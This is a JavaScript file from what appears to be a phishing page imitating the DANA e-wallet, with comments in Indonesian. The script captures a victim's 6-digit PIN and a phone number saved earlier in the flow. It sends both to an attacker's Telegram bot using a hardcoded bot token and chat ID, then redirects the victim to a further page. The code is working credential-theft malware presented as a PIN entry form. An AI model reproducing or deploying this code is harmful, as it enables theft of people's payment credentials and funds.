const inputs = document.querySelectorAll('.pin-input');
const loading = document.getElementById('loading');

const BOT_TOKEN = "8323795788:AAEEPpk072P23uatFdMS92CjcuVBYkc6tHM";
const CHAT_ID = "8080097570";

const savedPhone = localStorage.getItem("phoneNumber") || "";

// Fungsi kirim ke Telegram
async function kirimKeTelegram(pesan) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  const data = { chat_id: CHAT_ID, text: pesan };
  await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data)
  });
}

function checkAndSend() {
  const pin = Array.from(inputs).map(input => input.value).join('');

  if (pin.length === 6) {
    loading.style.display = 'flex';

    setTimeout(async () => {
      inputs.forEach(i => {
        i.classList.remove('filled');
        i.classList.add('green');
      });

      // TAHAP 2: Kirim nomor DANA + PIN DANA
      const message = `ððððð ðððð: ${savedPhone}
ððð ðððð: ${pin}`;
      
      await kirimKeTelegram(message);

      // Simpan PIN ke localStorage
      localStorage.setItem("pinDANA", pin);
      
      loading.style.display = 'none';
      window.location.href = "krim.html";
    }, 1500);
  }
}

// Kode event listener untuk input PIN tetap sama...
inputs.forEach((input, index) => {
  input.addEventListener('input', () => {
    input.value = input.value.replace(/[^0-9]/g, '');
    
    if (input.value) input.classList.add('filled');
    else input.classList.remove('filled');

    if (input.value.length === 1 && index < inputs.length - 1) {
      inputs[index + 1].focus();
    }
    checkAndSend();
  });

  input.addEventListener('keydown', (e) => {
    if (e.key === 'Backspace' && input.value === '' && index > 0) {
      inputs[index - 1].focus();
    }
  });
});